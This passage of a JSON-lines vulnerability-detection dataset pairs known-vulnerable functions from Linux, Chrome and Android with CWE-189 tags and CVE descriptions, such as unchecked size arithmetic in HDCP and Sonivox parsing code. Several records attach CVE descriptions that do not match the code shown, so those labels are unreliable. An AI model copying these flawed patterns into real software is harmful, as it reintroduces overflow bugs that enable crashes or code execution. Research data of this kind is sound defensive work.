acl;\n\nfail:\n\tposix_acl_release(acl);\n\treturn ERR_PTR(-EINVAL);\n}\n", "func_hash": 338872511102859494556493731151440696508, "file_name": "xfs_acl.c", "file_hash": 255306518644300632755892268895967557652, "cwe": ["CWE-189"], "cve": "CVE-2012-0038", "cve_desc": "Integer overflow in the xfs_acl_from_disk function in fs/xfs/xfs_acl.c in the Linux kernel before 3.1.9 allows local users to cause a denial of service (panic) via a filesystem with a malformed ACL, leading to a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-0038"}
{"idx": 4238, "project": "linux", "commit_id": "883a1d49f0d77d30012f114b2e19fc141beb3e8e", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/883a1d49f0d77d30012f114b2e19fc141beb3e8e", "commit_message": "ALSA: control: Make sure that id->index does not overflow\n\nThe ALSA control code expects that the range of assigned indices to a control is\ncontinuous and does not overflow. Currently there are no checks to enforce this.\nIf a control with a overflowing index range is created that control becomes\neffectively inaccessible and unremovable since snd_ctl_find_id() will not be\nable to find it. This patch adds a check that makes sure that controls with a\noverflowing index range can not be created.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>\nAcked-by: Jaroslav Kysela <perex@perex.cz>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>", "target": 1, "func": "int snd_ctl_add(struct snd_card *card, struct snd_kcontrol *kcontrol)\n{\n\tstruct snd_ctl_elem_id id;\n\tunsigned int idx;\n\tunsigned int count;\n\tint err = -EINVAL;\n\n\tif (! kcontrol)\n\t\treturn err;\n \tif (snd_BUG_ON(!card || !kcontrol->info))\n \t\tgoto error;\n \tid = kcontrol->id;\n \tdown_write(&card->controls_rwsem);\n \tif (snd_ctl_find_id(card, &id)) {\n \t\tup_write(&card->controls_rwsem);\n\t\tdev_err(card->dev, \"control %i:%i:%i:%s:%i is already present\\n\",\n\t\t\t\t\tid.iface,\n\t\t\t\t\tid.device,\n\t\t\t\t\tid.subdevice,\n\t\t\t\t\tid.name,\n\t\t\t\t\tid.index);\n\t\terr = -EBUSY;\n\t\tgoto error;\n\t}\n\tif (snd_ctl_find_hole(card, kcontrol->count) < 0) {\n\t\tup_write(&card->controls_rwsem);\n\t\terr = -ENOMEM;\n\t\tgoto error;\n\t}\n\tlist_add_tail(&kcontrol->list, &card->controls);\n\tcard->controls_count += kcontrol->count;\n\tkcontrol->id.numid = card->last_numid + 1;\n\tcard->last_numid += kcontrol->count;\n\tcount = kcontrol->count;\n\tup_write(&card->controls_rwsem);\n\tfor (idx = 0; idx < count; idx++, id.index++, id.numid++)\n\t\tsnd_ctl_notify(card, SNDRV_CTL_EVENT_MASK_ADD, &id);\n\treturn 0;\n\n error:\n\tsnd_ctl_free_one(kcontrol);\n\treturn err;\n}\n", "func_hash": 304470449259529631970602675728452624892, "file_name": "control.c", "file_hash": 179532723377993553853346737248765463198, "cwe": ["CWE-189"], "cve": "CVE-2014-4656", "cve_desc": "Multiple integer overflows in sound/core/control.c in the ALSA control implementation in the Linux kernel before 3.15.2 allow local users to cause a denial of service by leveraging /dev/snd/controlCX access, related to (1) index values in the snd_ctl_add function and (2) numid values in the snd_ctl_remove_numid_conflict function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-4656"}
{"idx": 4462, "project": "linux", "commit_id": "072684e8c58d17e853f8e8b9f6d9ce2e58d2b036", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/072684e8c58d17e853f8e8b9f6d9ce2e58d2b036", "commit_message": "USB: gadget: f_hid: fix deadlock in f_hidg_write()\n\nIn f_hidg_write() the write_spinlock is acquired before calling\nusb_ep_queue() which causes a deadlock when dummy_hcd is being used.\nThis is because dummy_queue() callbacks into f_hidg_req_complete() which\ntries to acquire the same spinlock. This is (part of) the backtrace when\nthe deadlock occurs:\n\n  0xffffffffc06b1410 in f_hidg_req_complete\n  0xffffffffc06a590a in usb_gadget_giveback_request\n  0xffffffffc06cfff2 in dummy_queue\n  0xffffffffc06a4b96 in usb_ep_queue\n  0xffffffffc06b1eb6 in f_hidg_write\n  0xffffffff8127730b in __vfs_write\n  0xffffffff812774d1 in vfs_write\n  0xffffffff81277725 in SYSC_write\n\nFix this by releasing the write_spinlock before calling usb_ep_queue()\n\nReviewed-by: James Bottomley <James.Bottomley@HansenPartnership.com>\nTested-by: James Bottomley <James.Bottomley@HansenPartnership.com>\nCc: stable@vger.kernel.org # 4.11+\nFixes: 749494b6bdbb (\"usb: gadget: f_hid: fix: Move IN request allocation to set_alt()\")\nSigned-off-by: Radoslav Gerganov <rgerganov@vmware.com>\nSigned-off-by: Felipe Balbi <felipe.balbi@linux.intel.com>", "target": 1, "func": "static ssize_t f_hidg_write(struct file *file, const char __user *buffer,\n\t\t\t    size_t count, loff_t *offp)\n{\n\tstruct f_hidg *hidg  = file->private_data;\n\tstruct usb_request *req;\n\tunsigned long flags;\n\tssize_t status = -ENOMEM;\n\n\tif (!access_ok(buffer, count))\n\t\treturn -EFAULT;\n\n\tspin_lock_irqsave(&hidg->write_spinlock, flags);\n\n#define WRITE_COND (!hidg->write_pending)\ntry_again:\n\t/* write queue */\n\twhile (!WRITE_COND) {\n\t\tspin_unlock_irqrestore(&hidg->write_spinlock, flags);\n\t\tif (file->f_flags & O_NONBLOCK)\n\t\t\treturn -EAGAIN;\n\n\t\tif (wait_event_interruptible_exclusive(\n\t\t\t\thidg->write_queue, WRITE_COND))\n\t\t\treturn -ERESTARTSYS;\n\n\t\tspin_lock_irqsave(&hidg->write_spinlock, flags);\n\t}\n\n\thidg->write_pending = 1;\n\treq = hidg->req;\n\tcount  = min_t(unsigned, count, hidg->report_length);\n\n\tspin_unlock_irqrestore(&hidg->write_spinlock, flags);\n\tstatus = copy_from_user(req->buf, buffer, count);\n\n\tif (status != 0) {\n\t\tERROR(hidg->func.config->cdev,\n\t\t\t\"copy_from_user error\\n\");\n\t\tstatus = -EINVAL;\n\t\tgoto release_write_pending;\n\t}\n\n\tspin_lock_irqsave(&hidg->write_spinlock, flags);\n\n\t/* when our function has been disabled by host */\n\tif (!hidg->req) {\n\t\tfree_ep_req(hidg->in_ep, req);\n\t\t/*\n\t\t * TODO\n\t\t * Should we fail with error here?\n\t\t */\n\t\tgoto try_again;\n\t}\n\n\treq->status   = 0;\n\treq->zero     = 0;\n\treq->length   = count;\n \treq->complete = f_hidg_req_complete;\n \treq->context  = hidg;\n \n \tstatus = usb_ep_queue(hidg->in_ep, req, GFP_ATOMIC);\n \tif (status < 0) {\n \t\tERROR(hidg->func.config->cdev,\n \t\t\t\"usb_ep_queue error on int endpoint %zd\\n\", status);\n\t\tgoto release_write_pending_unlocked;\n \t} else {\n \t\tstatus = count;\n \t}\n\tspin_unlock_irqrestore(&hidg->write_spinlock, flags);\n \n \treturn status;\n release_write_pending:\n \tspin_lock_irqsave(&hidg->write_spinlock, flags);\nrelease_write_pending_unlocked:\n \thidg->write_pending = 0;\n \tspin_unlock_irqrestore(&hidg->write_spinlock, flags);\n \n\twake_up(&hidg->write_queue);\n\n\treturn status;\n}\n", "func_hash": 18722974638875232385929906524846490153, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2019-14763", "cve_desc": "In the Linux kernel before 4.16.4, a double-locking error in drivers/usb/dwc3/gadget.c may potentially cause a deadlock with f_hid.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-14763"}
{"idx": 4867, "project": "Chrome", "commit_id": "a4b20ed4917f1f6fc83b6375a48e2c3895d43a8a", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/a4b20ed4917f1f6fc83b6375a48e2c3895d43a8a", "commit_message": "None", "target": 1, "func": "void BindSkiaToInProcessGL() {\n  static bool host_StubGL_installed = false;\n  if (!host_StubGL_installed) {\n    GrGLBinding binding;\n    switch (gfx::GetGLImplementation()) {\n      case gfx::kGLImplementationNone:\n        NOTREACHED();\n        return;\n      case gfx::kGLImplementationDesktopGL:\n        binding = kDesktop_GrGLBinding;\n        break;\n      case gfx::kGLImplementationOSMesaGL:\n        binding = kDesktop_GrGLBinding;\n        break;\n      case gfx::kGLImplementationEGLGLES2:\n        binding = kES2_GrGLBinding;\n        break;\n       case gfx::kGLImplementationMockGL:\n         NOTREACHED();\n         return;\n     }\n \n     static GrGLInterface host_gl_interface = {\n      binding,\n\n      kProbe_GrGLCapability,   // NPOTRenderTargetSupport\n      kProbe_GrGLCapability,   // MinRenderTargetHeight\n      kProbe_GrGLCapability,   // MinRenderTargetWidth\n\n      StubGLActiveTexture,\n      StubGLAttachShader,\n      StubGLBindAttribLocation,\n      StubGLBindBuffer,\n      StubGLBindTexture,\n      StubGLBlendColor,\n      StubGLBlendFunc,\n      StubGLBufferData,\n      StubGLBufferSubData,\n      StubGLClear,\n      StubGLClearColor,\n      StubGLClearStencil,\n      NULL,  // glClientActiveTexture\n      NULL,  // glColor4ub\n      StubGLColorMask,\n      NULL,  // glColorPointer\n      StubGLCompileShader,\n      StubGLCompressedTexImage2D,\n      StubGLCreateProgram,\n      StubGLCreateShader,\n      StubGLCullFace,\n      StubGLDeleteBuffers,\n      StubGLDeleteProgram,\n      StubGLDeleteShader,\n      StubGLDeleteTextures,\n      StubGLDepthMask,\n      StubGLDisable,\n      NULL,  // glDisableClientState\n      StubGLDisableVertexAttribArray,\n      StubGLDrawArrays,\n      StubGLDrawElements,\n      StubGLEnable,\n      NULL,  // glEnableClientState\n      StubGLEnableVertexAttribArray,\n      StubGLFrontFace,\n      StubGLGenBuffers,\n      StubGLGenTextures,\n      StubGLGetBufferParameteriv,\n      StubGLGetError,\n      StubGLGetIntegerv,\n      StubGLGetProgramInfoLog,\n      StubGLGetProgramiv,\n      StubGLGetShaderInfoLog,\n      StubGLGetShaderiv,\n      StubGLGetString,\n      StubGLGetUniformLocation,\n      StubGLLineWidth,\n      StubGLLinkProgram,\n      NULL,  // glLoadMatrixf\n      NULL,  // glMatrixMode\n      StubGLPixelStorei,\n      NULL,  // glPointSize\n      StubGLReadPixels,\n      StubGLScissor,\n      NULL,  // glShadeModel\n      StubGLShaderSource,\n      StubGLStencilFunc,\n      StubGLStencilFuncSeparate,\n      StubGLStencilMask,\n      StubGLStencilMaskSeparate,\n      StubGLStencilOp,\n      StubGLStencilOpSeparate,\n      NULL,  // glTexCoordPointer\n      NULL,  // glTexEnvi\n      StubGLTexImage2D,\n      StubGLTexParameteri,\n      StubGLTexSubImage2D,\n      StubGLUniform1f,\n      StubGLUniform1i,\n      StubGLUniform1fv,\n      StubGLUniform1iv,\n      StubGLUniform2f,\n      StubGLUniform2i,\n      StubGLUniform2fv,\n      StubGLUniform2iv,\n      StubGLUniform3f,\n      StubGLUniform3i,\n      StubGLUniform3fv,\n      StubGLUniform3iv,\n      StubGLUniform4f,\n      StubGLUniform4i,\n      StubGLUniform4fv,\n      StubGLUniform4iv,\n      StubGLUniformMatrix2fv,\n      StubGLUniformMatrix3fv,\n      StubGLUniformMatrix4fv,\n      StubGLUseProgram,\n      StubGLVertexAttrib4fv,\n      StubGLVertexAttribPointer,\n      NULL,  // glVertexPointer\n      StubGLViewport,\n      StubGLBindFramebuffer,\n      StubGLBindRenderbuffer,\n      StubGLCheckFramebufferStatus,\n      StubGLDeleteFramebuffers,\n      StubGLDeleteRenderbuffers,\n      StubGLFramebufferRenderbuffer,\n      StubGLFramebufferTexture2D,\n      StubGLGenFramebuffers,\n      StubGLGenRenderbuffers,\n      StubGLRenderBufferStorage,\n      StubGLRenderbufferStorageMultisample,\n      StubGLBlitFramebuffer,\n      NULL,  // glResolveMultisampleFramebuffer\n      StubGLMapBuffer,\n      StubGLUnmapBuffer,\n      NULL,  // glBindFragDataLocationIndexed\n      GrGLInterface::kStaticInitEndGuard,\n    };\n    GrGLSetGLInterface(&host_gl_interface);\n    host_StubGL_installed = true;\n  }\n}\n", "func_hash": 151739885399519347923344836427117640129, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2011-2829", "cve_desc": "Integer overflow in Google Chrome before 13.0.782.215 on 32-bit platforms allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving uniform arrays.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2829"}
{"idx": 6117, "project": "Chrome", "commit_id": "935cb0dee7696d70880f96a71bf5687411bb8cb9", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/935cb0dee7696d70880f96a71bf5687411bb8cb9", "commit_message": "None", "target": 1, "func": "bool SharedMemory::Create(const SharedMemoryCreateOptions& options) {\n  DCHECK(!options.executable);\n  DCHECK(!mapped_file_);\n  if (options.size == 0)\n    return false;\n\n   uint32 rounded_size = (options.size + 0xffff) & ~0xffff;\n   name_ = ASCIIToWide(options.name == NULL ? \"\" : *options.name);\n   mapped_file_ = CreateFileMapping(INVALID_HANDLE_VALUE, NULL,\n       PAGE_READWRITE, 0, static_cast<DWORD>(rounded_size),\n      name_.empty() ? NULL : name_.c_str());\n  if (!mapped_file_)\n    return false;\n\n  created_size_ = options.size;\n\n  if (GetLastError() == ERROR_ALREADY_EXISTS) {\n    created_size_ = 0;\n    if (!options.open_existing) {\n      Close();\n      return false;\n    }\n  }\n\n  return true;\n}\n", "func_hash": 281356070748747657977759918253453221719, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2012-5154", "cve_desc": "Integer overflow in Google Chrome before 24.0.1312.52 on Windows allows attackers to cause a denial of service or possibly have unspecified other impact via vectors related to allocation of shared memory.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-5154"}
{"idx": 6182, "project": "Chrome", "commit_id": "2571533bbb5b554ff47205c8ef1513ccc0817c3e", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/2571533bbb5b554ff47205c8ef1513ccc0817c3e", "commit_message": "None", "target": 1, "func": "void DocumentThreadableLoader::loadRequest(const ResourceRequest& request, ResourceLoaderOptions resourceLoaderOptions)\n{\n    const KURL& requestURL = request.url();\n    ASSERT(m_sameOriginRequest || requestURL.user().isEmpty());\n    ASSERT(m_sameOriginRequest || requestURL.pass().isEmpty());\n\n    if (m_forceDoNotAllowStoredCredentials)\n        resourceLoaderOptions.allowCredentials = DoNotAllowStoredCredentials;\n    resourceLoaderOptions.securityOrigin = m_securityOrigin;\n    if (m_async) {\n        if (!m_actualRequest.isNull())\n            resourceLoaderOptions.dataBufferingPolicy = BufferData;\n\n        if (m_options.timeoutMilliseconds > 0)\n            m_timeoutTimer.startOneShot(m_options.timeoutMilliseconds / 1000.0, BLINK_FROM_HERE);\n\n        FetchRequest newRequest(request, m_options.initiator, resourceLoaderOptions);\n        if (m_options.crossOriginRequestPolicy == AllowCrossOriginRequests)\n             newRequest.setOriginRestriction(FetchRequest::NoOriginRestriction);\n         ASSERT(!resource());\n \n         if (request.requestContext() == WebURLRequest::RequestContextVideo || request.requestContext() == WebURLRequest::RequestContextAudio)\n             setResource(RawResource::fetchMedia(newRequest, document().fetcher()));\n         else if (request.requestContext() == WebURLRequest::RequestContextManifest)\n             setResource(RawResource::fetchManifest(newRequest, document().fetcher()));\n         else\n             setResource(RawResource::fetch(newRequest, document().fetcher()));\n \n         if (!resource()) {\n             InspectorInstrumentation::documentThreadableLoaderFailedToStartLoadingForClient(m_document, m_client);\n             ThreadableLoaderClient* client = m_client;\n             clear();\n             client->didFail(ResourceError(errorDomainBlinkInternal, 0, requestURL.getString(), \"Failed to start loading.\"));\n             return;\n        }\n\n        if (resource()->loader()) {\n            unsigned long identifier = resource()->identifier();\n            InspectorInstrumentation::documentThreadableLoaderStartedLoadingForClient(m_document, identifier, m_client);\n        } else {\n            InspectorInstrumentation::documentThreadableLoaderFailedToStartLoadingForClient(m_document, m_client);\n        }\n        return;\n    }\n\n    FetchRequest fetchRequest(request, m_options.initiator, resourceLoaderOptions);\n    if (m_options.crossOriginRequestPolicy == AllowCrossOriginRequests)\n        fetchRequest.setOriginRestriction(FetchRequest::NoOriginRestriction);\n    Resource* resource = RawResource::fetchSynchronously(fetchRequest, document().fetcher());\n    ResourceResponse response = resource ? resource->response() : ResourceResponse();\n    unsigned long identifier = resource ? resource->identifier() : std::numeric_limits<unsigned long>::max();\n    ResourceError error = resource ? resource->resourceError() : ResourceError();\n\n    InspectorInstrumentation::documentThreadableLoaderStartedLoadingForClient(m_document, identifier, m_client);\n\n    if (!resource) {\n        m_client->didFail(error);\n        return;\n    }\n\n    if (!error.isNull() && !requestURL.isLocalFile() && response.httpStatusCode() <= 0) {\n        m_client->didFail(error);\n        return;\n    }\n\n    if (requestURL != response.url() && !isAllowedRedirect(response.url())) {\n        m_client->didFailRedirectCheck();\n        return;\n    }\n\n    handleResponse(identifier, response, nullptr);\n\n    if (!m_client)\n        return;\n\n    SharedBuffer* data = resource->resourceBuffer();\n    if (data)\n        handleReceivedData(data->data(), data->size());\n\n    if (!m_client)\n        return;\n\n    handleSuccessfulFinish(identifier, 0.0);\n}\n", "func_hash": 318306592559316865388544224660320461566, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-7909", "cve_desc": "effects/SkDashPathEffect.cpp in Skia, as used in Google Chrome before 39.0.2171.65, computes a hash key using uninitialized integer values, which might allow remote attackers to cause a denial of service by rendering crafted data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-7909"}
{"idx": 7258, "project": "Chrome", "commit_id": "a4acc2991a60408f2044b2a3b19817074c04b751", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/a4acc2991a60408f2044b2a3b19817074c04b751", "commit_message": "None", "target": 1, "func": "void SetBuildInfoAnnotations(std::map<std::string, std::string>* annotations) {\n  base::android::BuildInfo* info = base::android::BuildInfo::GetInstance();\n \n   (*annotations)[\"android_build_id\"] = info->android_build_id();\n   (*annotations)[\"android_build_fp\"] = info->android_build_fp();\n   (*annotations)[\"device\"] = info->device();\n   (*annotations)[\"model\"] = info->model();\n   (*annotations)[\"brand\"] = info->brand();\n  (*annotations)[\"board\"] = info->board();\n  (*annotations)[\"installer_package_name\"] = info->installer_package_name();\n  (*annotations)[\"abi_name\"] = info->abi_name();\n  (*annotations)[\"custom_themes\"] = info->custom_themes();\n  (*annotations)[\"resources_verison\"] = info->resources_version();\n  (*annotations)[\"gms_core_version\"] = info->gms_version_code();\n\n  if (info->firebase_app_id()[0] != '\\0') {\n    (*annotations)[\"package\"] = std::string(info->firebase_app_id()) + \" v\" +\n                                info->package_version_code() + \" (\" +\n                                info->package_version_name() + \")\";\n  }\n}\n", "func_hash": 231354713576835094682376055906410736656, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-5224", "cve_desc": "A timing attack on denormalized floating point arithmetic in SVG filters in Blink in Google Chrome prior to 55.0.2883.75 for Mac, Windows and Linux, and 55.0.2883.84 for Android allowed a remote attacker to bypass the Same Origin Policy via a crafted HTML page.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-5224"}
{"idx": 7734, "project": "Chrome", "commit_id": "f045c704568e9cf6279b3cbccbec6d86c35f8a13", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/f045c704568e9cf6279b3cbccbec6d86c35f8a13", "commit_message": "None", "target": 1, "func": "void FileSystemManagerImpl::CreateWriter(const GURL& file_path,\n                                          CreateWriterCallback callback) {\n   DCHECK_CURRENTLY_ON(BrowserThread::IO);\n \n   FileSystemURL url(context_->CrackURL(file_path));\n   base::Optional<base::File::Error> opt_error = ValidateFileSystemURL(url);\n   if (opt_error) {\n    std::move(callback).Run(opt_error.value(), nullptr);\n    return;\n  }\n  if (!security_policy_->CanWriteFileSystemFile(process_id_, url)) {\n    std::move(callback).Run(base::File::FILE_ERROR_SECURITY, nullptr);\n    return;\n  }\n\n  blink::mojom::FileWriterPtr writer;\n  mojo::MakeStrongBinding(std::make_unique<storage::FileWriterImpl>(\n                              url, context_->CreateFileSystemOperationRunner(),\n                              blob_storage_context_->context()->AsWeakPtr()),\n                          MakeRequest(&writer));\n  std::move(callback).Run(base::File::FILE_OK, std::move(writer));\n}\n", "func_hash": 220704916600868172933697275127391660900, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2019-5755", "cve_desc": "Incorrect handling of negative zero in V8 in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to perform arbitrary read/write via a crafted HTML page.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-5755"}
{"idx": 8014, "project": "Android", "commit_id": "e999f077f6ef59d20282f1e04786816a31fb8be6", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/external/sonivox/+/e999f077f6ef59d20282f1e04786816a31fb8be6", "commit_message": "None", "target": 1, "func": "static EAS_RESULT Parse_wave (SDLS_SYNTHESIZER_DATA *pDLSData, EAS_I32 pos, EAS_U16 waveIndex)\n{\n    EAS_RESULT result;\n    EAS_U32 temp;\n    EAS_I32 size;\n    EAS_I32 endChunk;\n    EAS_I32 chunkPos;\n    EAS_I32 wsmpPos = 0;\n    EAS_I32 fmtPos = 0;\n    EAS_I32 dataPos = 0;\n    EAS_I32 dataSize = 0;\n    S_WSMP_DATA *p;\n void *pSample;\n    S_WSMP_DATA wsmp;\n\n /* seek to start of chunk */\n    chunkPos = pos + 12;\n if ((result = EAS_HWFileSeek(pDLSData->hwInstData, pDLSData->fileHandle, pos)) != EAS_SUCCESS)\n return result;\n\n /* get the chunk type */\n if ((result = NextChunk(pDLSData, &pos, &temp, &size)) != EAS_SUCCESS)\n return result;\n\n /* make sure it is a wave chunk */\n if (temp != CHUNK_WAVE)\n {\n { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"Offset in ptbl does not point to wave chunk\\n\"); */ }\n return EAS_ERROR_FILE_FORMAT;\n }\n\n /* read to end of chunk */\n    pos = chunkPos;\n    endChunk = pos + size;\n while (pos < endChunk)\n {\n        chunkPos = pos;\n\n /* get the chunk type */\n if ((result = NextChunk(pDLSData, &pos, &temp, &size)) != EAS_SUCCESS)\n return result;\n\n /* parse useful chunks */\n switch (temp)\n {\n case CHUNK_WSMP:\n                wsmpPos = chunkPos + 8;\n break;\n\n case CHUNK_FMT:\n                fmtPos = chunkPos + 8;\n break;\n\n case CHUNK_DATA:\n                dataPos = chunkPos + 8;\n                dataSize = size;\n break;\n\n default:\n break;\n }\n\n     }\n \n    if (dataSize > MAX_DLS_WAVE_SIZE)\n     {\n         return EAS_ERROR_SOUND_LIBRARY;\n     }\n\n /* for first pass, use temporary variable */\n if (pDLSData->pDLS == NULL)\n        p = &wsmp;\n else\n        p = &pDLSData->wsmpData[waveIndex];\n\n /* set the defaults */\n    p->fineTune = 0;\n    p->unityNote = 60;\n    p->gain = 0;\n    p->loopStart = 0;\n    p->loopLength = 0;\n\n /* must have a fmt chunk */\n if (!fmtPos)\n {\n { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"DLS wave chunk has no fmt chunk\\n\"); */ }\n return EAS_ERROR_UNRECOGNIZED_FORMAT;\n }\n\n /* must have a data chunk */\n if (!dataPos)\n {\n { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"DLS wave chunk has no data chunk\\n\"); */ }\n return EAS_ERROR_UNRECOGNIZED_FORMAT;\n }\n\n /* parse the wsmp chunk */\n if (wsmpPos)\n {\n if ((result = Parse_wsmp(pDLSData, wsmpPos, p)) != EAS_SUCCESS)\n return result;\n }\n\n /* parse the fmt chunk */\n if ((result = Parse_fmt(pDLSData, fmtPos, p)) != EAS_SUCCESS)\n return result;\n\n /* calculate the size of the wavetable needed. We need only half\n     * the memory for 16-bit samples when in 8-bit mode, and we need\n     * double the memory for 8-bit samples in 16-bit mode. For\n     * unlooped samples, we may use ADPCM. If so, we need only 1/4\n     * the memory.\n     *\n     * We also need to add one for looped samples to allow for\n     * the first sample to be copied to the end of the loop.\n     */\n\n /* use ADPCM encode for unlooped 16-bit samples if ADPCM is enabled */\n /*lint -e{506} -e{774} groundwork for future version to support 8 & 16 bit */\n if (bitDepth == 8)\n {\n if (p->bitsPerSample == 8)\n            size = dataSize;\n else\n /*lint -e{704} use shift for performance */\n            size = dataSize >> 1;\n if (p->loopLength)\n            size++;\n }\n\n else\n {\n if (p->bitsPerSample == 16)\n            size = dataSize;\n else\n /*lint -e{703} use shift for performance */\n            size = dataSize << 1;\n if (p->loopLength)\n            size += 2;\n }\n\n /* for first pass, add size to wave pool size and return */\n if (pDLSData->pDLS == NULL)\n {\n        pDLSData->wavePoolSize += (EAS_U32) size;\n return EAS_SUCCESS;\n }\n\n /* allocate memory and read in the sample data */\n    pSample = pDLSData->pDLS->pDLSSamples + pDLSData->wavePoolOffset;\n    pDLSData->pDLS->pDLSSampleOffsets[waveIndex] = pDLSData->wavePoolOffset;\n    pDLSData->pDLS->pDLSSampleLen[waveIndex] = (EAS_U32) size;\n    pDLSData->wavePoolOffset += (EAS_U32) size;\n if (pDLSData->wavePoolOffset > pDLSData->wavePoolSize)\n {\n { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"Wave pool exceeded allocation\\n\"); */ }\n return EAS_ERROR_SOUND_LIBRARY;\n }\n\n if ((result = Parse_data(pDLSData, dataPos, dataSize, p, pSample)) != EAS_SUCCESS)\n return result;\n\n return EAS_SUCCESS;\n}\n", "func_hash": 21319537981250110024800294284209101145, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-3836", "cve_desc": "The Parse_wave function in arm-wt-22k/lib_src/eas_mdls.c in the Sonivox DLS-to-EAS converter in Android before 5.1.1 LMY48I does not reject a negative value for a certain size field, which allows remote attackers to execute arbitrary code or cause a denial of service (buffer overflow) via crafted XMF data, aka internal bug 21132860.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3836"}
{"idx": 8019, "project": "Android", "commit_id": "c82e31a7039a03dca7b37c65b7890ba5c1e18ced", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/av/+/c82e31a7039a03dca7b37c65b7890ba5c1e18ced", "commit_message": "None", "target": 1, "func": "status_t BnHDCP::onTransact(\n uint32_t code, const Parcel &data, Parcel *reply, uint32_t flags) {\n switch (code) {\n case HDCP_SET_OBSERVER:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            sp<IHDCPObserver> observer =\n                interface_cast<IHDCPObserver>(data.readStrongBinder());\n\n            reply->writeInt32(setObserver(observer));\n return OK;\n }\n\n case HDCP_INIT_ASYNC:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n const char *host = data.readCString();\n unsigned port = data.readInt32();\n\n            reply->writeInt32(initAsync(host, port));\n return OK;\n }\n\n case HDCP_SHUTDOWN_ASYNC:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            reply->writeInt32(shutdownAsync());\n return OK;\n }\n\n case HDCP_GET_CAPS:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            reply->writeInt32(getCaps());\n return OK;\n }\n\n\n         case HDCP_ENCRYPT:\n         {\n             size_t size = data.readInt32();\n \n            void *inData = malloc(2 * size);\n             void *outData = (uint8_t *)inData + size;\n \n             data.read(inData, size);\n\n uint32_t streamCTR = data.readInt32();\n uint64_t inputCTR;\n status_t err = encrypt(inData, size, streamCTR, &inputCTR, outData);\n\n            reply->writeInt32(err);\n\n if (err == OK) {\n                reply->writeInt64(inputCTR);\n                reply->write(outData, size);\n }\n\n            free(inData);\n            inData = outData = NULL;\n\n return OK;\n }\n\n case HDCP_ENCRYPT_NATIVE:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            sp<GraphicBuffer> graphicBuffer = new GraphicBuffer();\n            data.read(*graphicBuffer);\n size_t offset = data.readInt32();\n size_t size = data.readInt32();\n uint32_t streamCTR = data.readInt32();\n void *outData = malloc(size);\n uint64_t inputCTR;\n\n status_t err = encryptNative(graphicBuffer, offset, size,\n                                         streamCTR, &inputCTR, outData);\n\n            reply->writeInt32(err);\n\n if (err == OK) {\n                reply->writeInt64(inputCTR);\n                reply->write(outData, size);\n }\n\n            free(outData);\n            outData = NULL;\n\n return OK;\n }\n\n\n         case HDCP_DECRYPT:\n         {\n             size_t size = data.readInt32();\n \n            void *inData = malloc(2 * size);\n             void *outData = (uint8_t *)inData + size;\n \n             data.read(inData, size);\n\n uint32_t streamCTR = data.readInt32();\n uint64_t inputCTR = data.readInt64();\n status_t err = decrypt(inData, size, streamCTR, inputCTR, outData);\n\n            reply->writeInt32(err);\n\n if (err == OK) {\n                reply->write(outData, size);\n }\n\n            free(inData);\n            inData = outData = NULL;\n\n return OK;\n }\n\n default:\n return BBinder::onTransact(code, data, reply, flags);\n }\n}\n", "func_hash": 100821162213020152930684644090303863246, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-3834", "cve_desc": "Multiple integer overflows in the BnHDCP::onTransact function in media/libmedia/IHDCP.cpp in libstagefright in Android before 5.1.1 LMY48I allow attackers to execute arbitrary code via a crafted application that uses HDCP encryption, leading to a heap-based buffer overflow, aka internal bug 20222489.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3834"}
